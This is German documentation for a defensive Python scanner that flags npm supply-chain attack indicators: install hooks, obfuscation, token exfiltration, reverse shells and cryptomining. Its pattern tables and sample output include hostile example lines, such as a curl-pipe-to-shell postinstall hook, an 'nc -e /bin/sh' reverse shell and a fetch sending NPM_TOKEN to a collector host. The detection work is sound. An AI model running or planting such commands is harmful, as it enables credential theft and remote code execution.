# `scan-npm.py`

## Funktion

`scan-npm.py` durchsucht ein Node.js-Projekt nach Spuren von JavaScript-Trojanern und Supply-Chain-Angriffen. Der Scanner prüft zwei Ebenen:

- **Konfiguration**: Lifecycle-Hooks in `package.json`, versteckte Install-Hooks über `binding.gyp`, Registry-Umleitungen und Tokens in `.npmrc`/`.yarnrc`/`.yarnrc.yml`, aufgelöste URLs und fehlende Integrity-Hashes in Lockfiles.
- **Code**: Muster in JS/TS-Dateien, die auf Verschleierung, Exfiltration, Reverse Shells, Krypto-Mining oder manipulierte Module hindeuten.

Optional prüft er auch den lokalen npm-Cache. Das Skript nutzt nur die Python-Standardbibliothek.

Die Erkennung arbeitet mit regulären Ausdrücken pro Zeile. Ein Fund ist ein Hinweis zum Nachsehen, kein Beweis. Umgekehrt heißt ein leerer Report nicht, dass ein Paket sauber ist (siehe [Grenzen](#grenzen)).

## Einsatzgebiet

- **Abhängigkeits-Audits**: fremde Pakete vor dem Einbinden prüfen, zusammen mit `--include-modules`
- **CI/CD-Pipelines**: neue Lifecycle-Hooks, Git-Abhängigkeiten oder Registry-Umleitungen im Merge-Request auffallen lassen
- **Entwickler-Rechner**: den npm-Cache auf kompromittierte Pakete untersuchen (`--scan-cache`)
- **Incident Response**: nach einem bekannt gewordenen Paket-Kompromiss alle Projekte durchsuchen, zusammen mit [`scan-all-repos.sh`](scan-all-repos.sh)
- **Reviews externer Beiträge**: PRs auf eingeschleuste Backdoors prüfen

## Voraussetzungen

- Python 3.9+ (nur Standardbibliothek)
- `git` im `PATH`, wenn das Ziel ein Git-Repository ist
- `npm` im `PATH`, nur für `--scan-cache`

## Verwendung

```bash
# Aktuelles Verzeichnis scannen (nur eigene Projektdateien)
python3 scan-npm.py

# Installierte Abhängigkeiten in node_modules/ mitscannen
python3 scan-npm.py --include-modules

# Zusätzlich den npm-Cache scannen
python3 scan-npm.py --scan-cache

# Bestimmtes Projekt, JSON-Ausgabe
python3 scan-npm.py /pfad/zum/projekt --format json

# CI-Gate: nur HIGH zählt
python3 scan-npm.py --min-severity HIGH

# node_modules/ prüfen, aber nur MEDIUM und HIGH ausgeben
python3 scan-npm.py --include-modules --min-severity MEDIUM

# Pfade überspringen (Regex auf den relativen Pfad)
python3 scan-npm.py /pfad/zum/projekt --skip "dist/" "vendor/"

# Reporting ohne CI-Abbruch
python3 scan-npm.py --no-fail

# Alle Repositories unter ~/projects scannen
./scan-all-repos.sh scan-npm.py ~/projects results.txt
```

Ohne `--include-modules` oder `--scan-cache` gibt der Scanner im Textmodus einen Hinweis auf `stderr` aus. Die meisten Supply-Chain-Angriffe stecken in installierten Abhängigkeiten, nicht im eigenen Code.

### Optionen

| Option | Beschreibung |
| -------- | -------------- |
| `repo` | Pfad zum Projekt (Default: `.`) |
| `--include-modules` | Dateien in `node_modules/` mitscannen. Funktioniert auch, wenn `node_modules/` in `.gitignore` steht |
| `--scan-cache` | npm-Cache zusätzlich scannen (siehe [npm-Cache-Scan](#npm-cache-scan)) |
| `--min-severity HIGH\|MEDIUM\|LOW\|INFO` | Nur Funde ab diesem Schweregrad ausgeben und zählen (Default: `INFO`) |
| `--skip PATTERN ...` | Regex-Muster; Dateien, deren relativer Pfad darauf passt, werden nicht gelesen |
| `--format text\|json` | Ausgabeformat (Default: `text`) |
| `--no-fail` | Immer mit `0` beenden, auch bei Funden |

`--skip`-Muster werden ohne Beachtung der Groß-/Kleinschreibung ausgewertet. Ein ungültiger Regex wird als einfacher Teilstring verglichen. `--skip` nimmt alle folgenden Argumente als Muster, deshalb den Projektpfad davor schreiben: `scan-npm.py /pfad --skip dist/`, nicht `scan-npm.py --skip dist/ /pfad`.

`--min-severity` wirkt auch auf den Exit-Code. Mit dem Default `INFO` endet jedes Projekt mit einem Lifecycle-Hook mit `1`, selbst wenn der Hook harmlos ist. Für ein CI-Gate passt `--min-severity MEDIUM` oder `HIGH` besser.

## Schweregrade

| Stufe | Bedeutung |
| ------- | ----------- |
| `HIGH` | Muster, das in legitimem Code selten vorkommt, z. B. `curl` in `postinstall` oder `eval(atob(...))` |
| `MEDIUM` | Prüfenswert, oft auch legitim, z. B. Git-Abhängigkeiten, `binding.gyp`, fremde Registry |
| `LOW` | Erschwert die Analyse, z. B. stark minimierter Code |
| `INFO` | Inventar ohne Bewertung: vorhandene Lifecycle-Hooks |

## Kategorien

### `LIFECYCLE_HOOKS_FOUND` (INFO)

Listet jeden vorhandenen Lifecycle-Hook auf: `preinstall`, `install`, `postinstall`, `prepublish`, `preprepare`, `prepare`, `postprepare`, `prepack`, `postpack`. npm führt diese Hooks bei `npm install` bzw. `npm pack`/`npm publish` ohne Rückfrage aus. Andere Skripte wie `build` oder `test` prüft der Scanner nicht, weil sie nur auf ausdrücklichen Aufruf laufen.

### `INSTALL_SCRIPT` (HIGH / MEDIUM)

Prüft den Inhalt der Lifecycle-Hooks. Aus der folgenden Liste meldet der Scanner pro Hook nur das erste passende Muster (HIGH):

| Muster | Beispiel |
| -------- | ---------- |
| `curl`, `wget` | `curl -s https://x.example/setup.sh \| sh` |
| `nc`, `ncat`, `netcat` | `nc -e /bin/sh host 4444` |
| `base64` mit `decode` | `echo ... \| base64 --decode` |
| `eval(` | `node -e "eval(...)"` |
| Inline-Python | `python3 -c '...'` |
| `chmod` mit ausführbaren Bits | `chmod 755 ./payload` |
| `/etc/passwd`, `/etc/shadow` | `cat /etc/passwd` |
| SSH-Verzeichnis | `cp key ~/.ssh/` |
| HTTP(S)-URL außerhalb von `registry.npmjs.org`, `registry.yarnpkg.com`, `npm.pkg.github.com` | `https://cdn.example.com/x` |
| Mining-Begriffe | `stratum+tcp`, `xmrig`, `monero`, `coinhive` |

Zusätzlich, unabhängig von der Liste oben:

- `process.env` oder `require('child_process')` zusammen mit einem Netzwerkaufruf im selben Hook (HIGH)
- `node -e` / `node --eval` im Hook (MEDIUM)
- `binding.gyp` vorhanden (MEDIUM). npm startet dann `node-gyp rebuild` beim Install, auch ohne Eintrag in `scripts`. Die Zeilen der Datei laufen zusätzlich gegen die Musterliste oben (HIGH).
- `"gypfile": true` in `package.json` (MEDIUM), aus demselben Grund

### `OBFUSCATION` (HIGH / MEDIUM / LOW)

| Schweregrad | Muster |
| ------------- | -------- |
| HIGH | `eval(Buffer.from(...))`, `eval(atob(...))`, `eval(unescape(...))` |
| HIGH | `Buffer.from("<32+ Hex-Zeichen>", "hex")` |
| HIGH | `Buffer.from("<40+ Base64-Zeichen>", "base64")` |
| HIGH | `String.fromCharCode(...)` mit 6 oder mehr Argumenten |
| HIGH | Klammer-Notation mit Konkatenation: `obj["ex" + "ec"]` |
| HIGH | Aufgeteilter Modulname: `require("child_" + "process")` |
| HIGH | Zweistufig: `const m = "child_" + "process"; ... require(m)` |
| MEDIUM | `_0x`-Bezeichner (Ausgabe gängiger JS-Obfuskatoren) |
| MEDIUM | Hex-String mit 64+ Zeichen in einer Variablen |
| MEDIUM | `eval()` eines zusammengesetzten String-Literals |
| MEDIUM | `import()` mit zusammengesetztem Pfad: `import(base + "/x")` |
| LOW | `unescape()` mit langer Prozent-Kodierung |
| LOW | Zeile mit 1000 oder mehr Zeichen (ein Fund pro Datei) |

### `EXFILTRATION` (HIGH / MEDIUM)

| Schweregrad | Muster |
| ------------- | -------- |
| HIGH | `process.env` und HTTP-Aufruf (`fetch`, `axios`, `request`, `require('http')`) innerhalb von 120 Zeichen |
| HIGH | `HOME`, `NPM_TOKEN`, `GITHUB_TOKEN`, `GITLAB_TOKEN`, `CI_JOB_TOKEN`, `AWS_SECRET`, `DOCKER_PASSWORD` u. a. vor `http`/`fetch`/`axios`/`send`. Die Namen werden mit Groß-/Kleinschreibung verglichen, `homeUrl` zählt nicht |
| HIGH | `readFile`/`readFileSync` auf `.ssh`, `.aws`, `.npmrc`, `.gitconfig`, `passwd`, `shadow` |
| HIGH | `dns.resolve`/`dns.lookup` mit `process.env`, `Buffer.from`, `btoa` oder `.toString("hex"/"base64")` im Hostnamen |
| HIGH | `dns.resolve`/`dns.lookup` mit `+`-zusammengesetztem Hostnamen |
| MEDIUM | `os.homedir()` gefolgt von `.ssh`, `.aws`, `.npmrc`, `.gitconfig` |
| MEDIUM | `require('keytar')` (Zugriff auf den OS-Schlüsselbund) |
| MEDIUM | Hardcodierter Token in `.npmrc`, `.yarnrc`, `.yarnrc.yml`, `pnpm-lock.yaml`. Der Report zeigt ihn maskiert als `***` |
| MEDIUM | `process.env` in einer Datei mit Netzwerkcode (siehe [Kontextregeln](#kontextregeln)) |
| MEDIUM | `dns`-Modul und `process.env` in derselben Datei (siehe [Kontextregeln](#kontextregeln)) |

### `FILESYSTEM_ATTACK` (HIGH / MEDIUM)

| Schweregrad | Muster |
| ------------- | -------- |
| HIGH | `writeFile`/`appendFile`/`createWriteStream` auf `/etc/passwd`, `/etc/shadow`, `/etc/cron*`, `~/.ssh`, `~/.bashrc`, `~/.profile`, `~/.zshrc`, `~/.config/git` |
| HIGH | Schreiben in `authorized_keys` |
| MEDIUM | Schreiben in `crontab`, `cron.d`, `cron.hourly` |
| MEDIUM | Schreiben in `.bashrc`, `.profile`, `.zshrc` |

### `REMOTE_EXEC` (HIGH / MEDIUM)

| Schweregrad | Muster |
| ------------- | -------- |
| HIGH | `require('child_process')` mit `exec`/`spawn`/`execSync`/`spawnSync` auf derselben Zeile |
| HIGH | `new Function(...)` mit `fetch`, `http`, `Buffer.from` oder `atob` |
| HIGH | `import("https://...")` |
| HIGH | `import(fetch(...))`, `import(Buffer.from(...))` |
| HIGH | `net.connect`/`tls.connect` mit `stdin`/`stdout`/`pipe`/`shell` (Reverse Shell) |
| HIGH | `/bin/sh` oder `/bin/bash` mit `-i`/`-c` und `socket`/`connect`/`pipe` |
| MEDIUM | `vm.runInNewContext()`, `vm.runInThisContext()` |
| MEDIUM | `https.get`/`fetch` gefolgt von `eval`, `new Function` oder `vm.run` |
| MEDIUM | `child_process` in einer Datei mit Netzwerkcode (siehe [Kontextregeln](#kontextregeln)) |

### `CRYPTOMINING` (HIGH / MEDIUM)

| Schweregrad | Muster |
| ------------- | -------- |
| HIGH | `stratum+tcp://` |
| HIGH | Miner-Namen: `xmrig`, `xmr-stak`, `cpuminer`, `nsfminer` |
| HIGH | Mining-Dienste: `coinhive.com`, `coin-hive.com`, `minero.cc`, `cryptoloot.pro`, `webminepool.com`, `jsecoin.com`, `monerominer.*` |
| MEDIUM | `CryptoNight`, `RandomX` oder `Ethash`, gefolgt von `worker`, `mine`, `pool` oder `hash` |

### `SUPPLY_CHAIN` (HIGH / MEDIUM / LOW)

| Schweregrad | Muster |
| ------------- | -------- |
| HIGH | `Module._compile()` mit `decrypt`/`decipher`/`Buffer.from` (event-stream-Angriff 2018) |
| HIGH | `require.extensions[...]`, `Module._extensions[...]` |
| HIGH | IP-Ermittlungsdienste: `ipify.org`, `icanhazip.com`, `ipinfo.io`, `ifconfig.me`, `checkip.amazonaws.com` u. a. |
| HIGH | IP-Präfix-Vergleich gegen Zahl: `ip.startsWith("5.")` |
| HIGH | IP-Quelle und löschende/schreibende Dateioperation in derselben Datei (node-ipc-Angriff 2022) |
| HIGH | Yarn-Plugin von externer URL in `.yarnrc.yml` |
| MEDIUM | Abhängigkeit mit `git+https://`, `git+ssh://`, `git://`, `github:`, `gitlab:`, `bitbucket:` oder HTTP(S)-URL außerhalb von `registry.npmjs.org`, `registry.yarnpkg.com`, `npm.pkg.github.com`, `pkgs.dev.azure.com` |
| MEDIUM | Nicht-Standard-Registry in `.npmrc`, `.yarnrc`, `.yarnrc.yml`, `pnpm-lock.yaml` |
| MEDIUM | `resolved`-URL in `package-lock.json` bzw. `tarball`-URL in `pnpm-lock.yaml` außerhalb der Standard-Registries |
| MEDIUM | Paket ohne `integrity` in `package-lock.json` |
| MEDIUM | Natives `.node`-Addon (Binärcode, nicht statisch prüfbar) |
| MEDIUM | `npm_lifecycle_event` oder `npm_package_name` vor `fetch`/`http`/`send` |
| LOW | `__webpack_require__.c` mit `eval`/`Function` |

### Standard-Registries

Als unbedenklich gelten nur `https://`-URLs auf diese Hosts:

- `registry.npmjs.org`, `registry.yarnpkg.com`, `npm.pkg.github.com`, `pkgs.dev.azure.com`
- Hosts, die mit `artifactory.` oder `nexus.` beginnen (eigene Repository-Manager)

Verglichen wird der echte Hostname aus der URL, nicht ein String-Präfix. `https://registry.npmjs.org.evil.example/` gilt deshalb als fremd, ebenso `http://registry.npmjs.org/` ohne TLS.

## Gescannte Dateien

| Datei | Prüfung |
| ------- | --------- |
| `package.json` | Lifecycle-Hooks, Git-/URL-Abhängigkeiten, `gypfile` |
| `package-lock.json` | `resolved`-URLs und `integrity` (Lockfile v1, v2, v3) |
| `pnpm-lock.yaml` / `pnpm-lock.yml` | `tarball`-URLs, Registry-Overrides, Tokens |
| `binding.gyp` | Vorhandensein und verdächtige Befehle |
| `.npmrc` / `.npmrc.example` | Registry-Umleitungen, `_authToken` |
| `.yarnrc` | Yarn-v1-Registry und Tokens, mit und ohne Anführungszeichen |
| `.yarnrc.yml` / `.yarnrc.yaml` | Yarn-v2/v3-Registry, `npmAuthToken`, Plugins von externen URLs |
| `*.js`, `*.cjs`, `*.mjs`, `*.ts`, `*.cts`, `*.mts`, `*.jsx`, `*.tsx` | alle Code-Regeln |
| `*.node` | als natives Addon gemeldet |

`yarn.lock` und `bun.lock`/`bun.lockb` prüft der Scanner nicht.

## Dateiauswahl

Welche Dateien der Scanner liest, hängt vom Ziel ab:

- **Root eines Git-Repositories** (`.git` ist ein Verzeichnis): alle Dateien aus `git ls-files --cached --others --exclude-standard`, also versionierte und neue Dateien, die nicht in `.gitignore` stehen. Mit `--include-modules` kommen alle Dateien unter jedem `node_modules/`-Verzeichnis dazu, direkt vom Dateisystem gelesen. Symlinks folgt der Scanner dabei nicht.
- **Alles andere** (kein Git, Unterverzeichnis eines Repos, Worktree oder Submodul mit `.git`-Datei): rekursiv alle Dateien im Verzeichnis. `.gitignore` spielt dann keine Rolle. `node_modules/` überspringt der Scanner ohne `--include-modules`.

Immer übersprungen werden:

- Dateien unter `node_modules/` ohne `--include-modules`
- Bilder, Archive, Java-Artefakte, kompilierte Dateien, Fonts, Audio und Video (nach Dateiendung)
- Binärdateien (Null-Byte in den ersten 8 KB). Ausnahme: `.node`-Addons meldet der Scanner vorher.
- Pfade, die auf ein `--skip`-Muster passen

## Kontextregeln

Einige Muster sind allein normal und werden erst im Zusammenhang verdächtig. Damit React-, Vite- oder Next.js-Projekte nicht in Funden untergehen, gelten diese Regeln:

- **`process.env` und `child_process`** meldet der Scanner nur dann als MEDIUM, wenn dieselbe Datei auch Netzwerkcode enthält (`fetch(`, `axios(`, `got(`, `http.get(`, `net.connect(`, `new WebSocket(`, `import()` mit URL u. a.). Er meldet nur das erste Vorkommen pro Datei und überspringt Zeilen, die schon einen anderen Fund haben.
- **`dns` mit `process.env`** in einer Datei ergibt einen MEDIUM-Fund, aber nur wenn in der Datei noch kein HIGH-Fund der Kategorie `EXFILTRATION` steht.
- **IP-Quelle und Dateioperation** (node-ipc-Muster) ergeben einen HIGH-Fund pro Datei, wenn beides in derselben Datei vorkommt.
- **In Lifecycle-Hooks** zählen `process.env` und `child_process` nur zusammen mit `curl`, `wget`, `fetch(`, `require('http')` oder einer URL im selben Hook.

Weitere Regeln gegen Rauschen:

- Pro Zeile und Kategorie gibt es höchstens einen Fund. Treffen mehrere Regeln, gewinnt die mit dem höchsten Schweregrad.
- In JS/TS-Dateien ignoriert der Scanner Zeilen, die mit `//` oder `*` beginnen.
- In `package-lock.json` ignoriert er Workspace-Links (`"link": true`) sowie `resolved`-Werte mit `file:` oder `node_modules/`.

## npm-Cache-Scan

Mit `--scan-cache` fragt der Scanner `npm config get cache` ab (meist `~/.npm`) und liest jeden Blob unter `_cacache/content-v2/`. Pakete liegen dort als gzip-Tarballs. Der Scanner entpackt sie im Speicher und ändert am Cache nichts.

- Geprüft werden dieselben Dateitypen wie im Projekt, außer `.node`-Addons und der Prüfung auf minimierten Code.
- Dateien über 512 KB im Tarball überspringt er.
- Blobs, die keine Tarballs sind (z. B. Paket-Metadaten), überspringt er ohne Meldung.
- Der Cache enthält alle Pakete, die dieser Benutzer auf diesem Rechner je geladen hat, nicht nur die des gescannten Projekts.
- Die Projektdateien scannt der Scanner trotzdem mit.

Cache-Funde tragen statt eines Dateipfads ein Label wie `[cache:3f9a1c0b7e2d4a65]package/lib/index.js`. Die 16 Zeichen sind der Anfang des Blob-Dateinamens. So findet man den Paketnamen:

```bash
blob=$(find ~/.npm/_cacache/content-v2 -name '3f9a1c0b7e2d4a65*')
tar -xzOf "$blob" package/package.json | grep -m2 -E '"(name|version)"'
```

## Ausgabe

### Text (Default)

Funde sind nach Kategorie gruppiert und innerhalb davon nach Schweregrad, Datei und Zeile sortiert. `Context` zeigt die Quellzeile bzw. den Hook-Inhalt, gekürzt auf 120 Zeichen. Zeile `0` oder eine fehlende Zeilennummer bedeutet, dass sich der Fund auf die ganze Datei bezieht (z. B. bei `binding.gyp`, `.node`-Addons und allen `package-lock.json`-Funden).

```text
Scanne 2 Datei(en) in '/pfad/zum/projekt' ...

========================================================================
  NPM/JS-Bedrohungsscan — 4 Befund(e)
========================================================================

  LIFECYCLE_HOOKS_FOUND (1)
  --------------------------------------------
  [INFO]   package.json:5
    Detail : Lifecycle-Hook 'postinstall' vorhanden
    Context: curl -s https://cdn.example.com/setup.sh | sh

  INSTALL_SCRIPT (1)
  --------------------------------------------
  [HIGH]   package.json:5
    Detail : curl im Install-Skript — häufiger Exfiltrations-/Download-Vektor
    Context: curl -s https://cdn.example.com/setup.sh | sh

  EXFILTRATION (1)
  --------------------------------------------
  [HIGH]   src/index.js:1
    Detail : process.env-Lesen kombiniert mit HTTP-Aufruf — Exfiltration von Umgebungsvariablen
    Context: const token = process.env.NPM_TOKEN; fetch('https://collector.example.com/?t=' + token);

  SUPPLY_CHAIN (1)
  --------------------------------------------
  [MED]    package.json:8
    Detail : Abhängigkeit mit Nicht-Registry-URL: git+https://github.com/example/left-pad.git
    Context: "left-pad": "git+https://github.com/example/left-pad.git"

========================================================================
  Gesamt: 4 Befund(e) in 2 Datei(en)  [HIGH=2  MEDIUM=1  LOW=0  INFO=1]
========================================================================
```

Ohne Funde erscheint nur `Keine NPM/JS-Bedrohungsindikatoren gefunden.`

Auf einem Terminal ist HIGH rot und MEDIUM orange. `NO_COLOR=1` schaltet die Farben ab, bei Umleitung in eine Datei oder Pipe sind sie automatisch aus.

### JSON

`--format json` gibt ein Array aus, ein Objekt pro Fund, in der Reihenfolge der Dateien. Fortschrittszeilen und der `node_modules`-Hinweis entfallen. Umlaute und Gedankenstriche stehen als `\uXXXX`-Escapes im JSON, `jq` gibt sie wieder lesbar aus.

```json
[
  {
    "category": "INSTALL_SCRIPT",
    "severity": "HIGH",
    "source": "scripts.postinstall",
    "detail": "curl im Install-Skript — häufiger Exfiltrations-/Download-Vektor",
    "file": "package.json",
    "line": 5,
    "context": "curl -s https://cdn.example.com/setup.sh | sh"
  }
]
```

| Feld | Inhalt |
| ------ | -------- |
| `category` | Kategorie, z. B. `INSTALL_SCRIPT` |
| `severity` | `HIGH`, `MEDIUM`, `LOW` oder `INFO` |
| `source` | Herkunft innerhalb der Datei, z. B. `scripts.postinstall`, `dependencies.left-pad`, `.npmrc`, `binding.gyp`, `MINIFIED_CODE`, `NATIVE_ADDON`, `DNS_EXFIL`, `IP_CONDITIONAL`. Bei Code-Regeln die Kategorie |
| `detail` | Beschreibung des Musters |
| `file` | Pfad relativ zum Projekt bzw. Cache-Label |
| `line` | Zeilennummer, `0` für die ganze Datei |
| `context` | Quellzeile oder Hook-Inhalt, Tokens maskiert |

Beispiel: nur HIGH-Funde als Liste `datei:zeile kategorie`:

```bash
python3 scan-npm.py --format json --no-fail \
  | jq -r '.[] | select(.severity == "HIGH") | "\(.file):\(.line) \(.category)"'
```

Fehler beim Lesen einzelner Dateien oder Cache-Blobs gehen auf `stderr`, der Scan läuft weiter.

## Exit-Codes

| Code | Bedeutung |
| ------ | ----------- |
| `0` | Keine Funde ab `--min-severity` (oder `--no-fail` gesetzt) |
| `1` | Funde vorhanden |
| `2` | Skriptfehler: `git ls-files` fehlgeschlagen oder mindestens eine Datei konnte nicht gescannt werden |

Code `2` hat Vorrang vor `1` und gilt auch mit `--no-fail`.

## Testen

```bash
# Unit-Tests
uv run pytest tests/test_scan_npm.py -v

# Testprojekt in /tmp/npm-scan-testproject erzeugen, das jede Regel auslöst, und scannen
bash testproject.sh
```

`testproject.sh` legt nur inerte Testdaten an und führt keinen der Inhalte aus. Am Ende fragt es, ob das Testprojekt gelöscht werden soll.

## Grenzen

- **Zeilenweise Regex**: Der Scanner versteht keinen Code. Er kennt weder Datenfluss noch Variablenwerte über mehrere Zeilen. `const u = "https://..."` in Zeile 1 und `fetch(u)` in Zeile 20 hängt er nicht zusammen.
- **Verschleierung ist ein Wettlauf**: Die Regeln decken bekannte Muster ab. Ein Angreifer, der die Regeln kennt, kommt an ihnen vorbei. Stark minimierter Code bekommt deshalb nur einen LOW-Fund als Hinweis.
- **Keine Schwachstellen-Datenbank**: Bekannte CVEs und veröffentlichte Malware-Versionen prüft der Scanner nicht. Dafür gibt es `npm audit` oder OSV-Scanner.
- **Repository-Manager per Präfix**: Jeder Host, der mit `artifactory.` oder `nexus.` beginnt, gilt als Standard-Registry, auch `artifactory.attacker.example`. Wer eine eigene Registry nutzt, sollte deren URL im Report trotzdem einmal prüfen.
- **Nicht alle Lockfiles**: `yarn.lock` und Bun-Lockfiles bleiben ungeprüft.
- **YAML ohne Parser**: `pnpm-lock.yaml` und `.yarnrc.yml` werden zeilenweise per Regex gelesen. Ungewöhnliche Formatierung (mehrzeilige Werte, Anker) kann Funde verhindern.
- **Ungenaue Zeilennummern**: `package-lock.json`-Funde haben immer Zeile `0`. Bei Abhängigkeiten in `package.json` zeigt die Zeile auf das erste Vorkommen des Paketnamens.
- **Nur der aktuelle Stand**: Die Git-Historie wird nicht durchsucht.
- **Erwartbare Falsch-Positive**: Build-Tools, die `child_process` und HTTP in einer Datei nutzen. Legitime Nutzung von IP-Diensten wie `ipinfo.io`. `_0x`-Bezeichner in mitgelieferten Bundles. Mit `--include-modules` kommen viele LOW-Funde für minimierte Dateien dazu, `--min-severity MEDIUM` blendet sie aus.
